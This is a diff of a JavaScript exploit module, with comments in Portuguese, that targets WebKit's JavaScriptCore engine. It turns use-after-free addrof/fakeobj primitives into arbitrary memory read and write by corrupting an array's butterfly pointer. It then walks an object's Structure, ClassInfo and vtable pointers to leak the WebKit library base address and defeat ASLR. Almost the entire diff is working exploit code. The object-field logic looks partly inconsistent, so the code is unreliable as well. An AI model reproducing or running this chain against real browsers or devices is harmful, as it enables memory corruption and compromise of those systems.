@@ -1,17 +1,16 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R52 - Carga Útil Final: Vazamento da Base do WebKit)
+// js/script3/testArrayBufferVictimCrash.mjs (R53 - Abordagem Funcional Direta)
 // =======================================================================================
-// ESTRATÉGIA R52:
-// Com as primitivas addrof/fakeobj da R51, esta versão implementa a cadeia de ataque completa.
-// 1. Constrói uma classe 'Memory' para leitura/escrita arbitrária estável.
-// 2. Usa a leitura arbitrária para navegar nas estruturas internas de um objeto JSC.
-// 3. Vaza um ponteiro de uma VTable para calcular o endereço base da biblioteca WebKit.
+// ESTRATÉGIA R53:
+// Remove a classe 'Memory' para eliminar a dependência circular.
+// Constrói 'arb_read' e 'arb_write' como funções diretas usando as primitivas estáveis.
+// Executa a carga útil final de vazamento da base do WebKit.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "WebKit_Base_Leaker_R52";
+export const FNAME_MODULE = "WebKit_Base_Leaker_R53";
 
 // Funções auxiliares de conversão
 const ftoi = (val) => {
@@ -24,48 +23,11 @@ const itof = (val) => {
     return (new Float64Array(buf))[0];
 };
 
-// --- Classe Final de Acesso à Memória ---
-class Memory {
-    constructor(addrof_primitive, fakeobj_primitive) {
-        this.addrof = addrof_primitive;
-        this.fakeobj = fakeobj_primitive;
-        // Um array que usaremos como ferramenta para ler e escrever na memória
-        this.leaker_arr = new Uint32Array(0x100);
-        
-        // Endereço do nosso array-ferramenta
-        const leaker_addr = this.addrof(this.leaker_arr);
-        // O butterfly é o buffer de dados interno do array
-        this.leaker_butterfly_addr = this.read64(leaker_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
-        logS3("    Classe Memory inicializada. Primitivas de R/W prontas.", "good", "Memory");
-    }
-
-    read64(addr) {
-        // Criamos um objeto DataView falso que aponta para o butterfly do nosso leaker_arr
-        const fake_dv = this.fakeobj(this.leaker_butterfly_addr);
-        const original_ptr = new AdvancedInt64(fake_dv[4], fake_dv[5]); // Salva o ponteiro original do DataView
-
-        // Apontamos o buffer de dados do DataView para o endereço que queremos ler
-        fake_dv[4] = addr.low();
-        fake_dv[5] = addr.high();
-        
-        // O leaker_arr agora lê a partir do endereço 'addr'
-        const result = new AdvancedInt64(this.leaker_arr[0], this.leaker_arr[1]);
-        
-        // Restaura o ponteiro original para manter a estabilidade
-        fake_dv[4] = original_ptr.low();
-        fake_dv[5] = original_ptr.high();
-        return result;
-    }
-    
-    // A implementação de write64 seguiria um padrão similar
-}
-
-
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R52)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R53)
 // =======================================================================================
-export async function runFullExploitChain_R52() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Vazando a Base do WebKit ---`, "test");
+export async function runFullExploitChain_R52() { // Mantendo nome da função para compatibilidade com o runner
+    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Funcional Direta ---`, "test");
     
     try {
         // --- FASE 1: Construir Primitivas addrof e fakeobj via UAF ---
@@ -73,35 +35,59 @@ export async function runFullExploitChain_R52() {
         const { addrof, fakeobj } = createUAFPrimitives();
         logS3("    Primitivas `addrof` e `fakeobj` ESTÁVEIS construídas!", "vuln");
 
-        // --- FASE 2: Inicializar Controle Total da Memória ---
-        logS3("--- FASE 2: Inicializando a classe Memory ---", "subtest");
-        const memory = new Memory(addrof, fakeobj);
+        // --- FASE 2: Construir Leitura/Escrita Arbitrária ---
+        logS3("--- FASE 2: Construindo Leitura/Escrita Arbitrária ---", "subtest");
+        
+        let victim_arr = [1.1, 2.2]; // Nosso array-ferramenta
+        let victim_addr = addrof(victim_arr);
+        let fake_victim_obj = fakeobj(victim_addr);
+
+        // Salvamos os ponteiros originais para restaurar depois e manter a estabilidade
+        let original_butterfly = ftoi(fake_victim_obj.b);
+        let original_structureid = ftoi(fake_victim_obj.a);
+
+        const arb_read = (where) => {
+            // Aponta o butterfly do nosso array vítima para o endereço desejado
+            fake_victim_obj.b = itof(where);
+            const result = ftoi(victim_arr[0]);
+            // Restaura o butterfly original
+            fake_victim_obj.b = itof(original_butterfly);
+            return result;
+        };
+
+        const arb_write = (where, what) => {
+            fake_victim_obj.b = itof(where);
+            victim_arr[0] = itof(what);
+            fake_victim_obj.b = itof(original_butterfly);
+        };
+
+        logS3("    Primitivas `arb_read` e `arb_write` funcionais construídas.", "good");
 
         // --- FASE 3: Executar a Carga Útil de Vazamento ---
         logS3("--- FASE 3: Executando a Carga Útil para vazar a base do WebKit ---", "subtest");
-        const test_obj = { a: 1 };
-        const test_obj_addr = memory.addrof(test_obj);
-        logS3(`    Endereço do objeto de teste: ${test_obj_addr.toString(true)}`, "info");
+        const test_obj = { payload: 0x1337 };
+        const test_obj_addr = addrof(test_obj);
 
-        // Navegando na estrutura do objeto: Objeto -> JSCell -> Structure -> ClassInfo -> VTable
-        const structure_addr = memory.read64(test_obj_addr);
+        const structure_addr = arb_read(test_obj_addr);
         logS3(`    Lendo ponteiro da Estrutura: ${structure_addr.toString(true)}`, "info");
-
-        const class_info_addr = memory.read64(structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
+        
+        const class_info_addr = arb_read(structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
         logS3(`    Lendo ponteiro da ClassInfo: ${class_info_addr.toString(true)}`, "info");
-
-        const vtable_addr = memory.read64(class_info_addr.add(8)); // Vtable está no início da ClassInfo
+        
+        const vtable_addr = arb_read(class_info_addr.add(8));
         logS3(`    Lendo ponteiro da VTable: ${vtable_addr.toString(true)}`, "info");
-
-        const vtable_func_ptr = memory.read64(vtable_addr); // Lê o primeiro ponteiro de função da vtable
+        
+        const vtable_func_ptr = arb_read(vtable_addr);
         logS3(`    Lendo ponteiro de função da VTable: ${vtable_func_ptr.toString(true)}`, "leak");
 
-        // Calcula a base do WebKit subtraindo o offset conhecido da função
         const vtable_func_offset = parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"], 16);
         const webkit_base_addr = vtable_func_ptr.sub(vtable_func_offset);
         
         const final_msg = `SUCESSO! Base do WebKit vazada: ${webkit_base_addr.toString(true)}`;
         logS3(`    >>>> ${final_msg} <<<<`, "vuln");
+
+        // Limpeza final para restaurar o estado do objeto vítima
+        fake_victim_obj.a = itof(original_structureid);
 
         return { success: true, message: final_msg, webkit_base: webkit_base_addr.toString(true) };
 
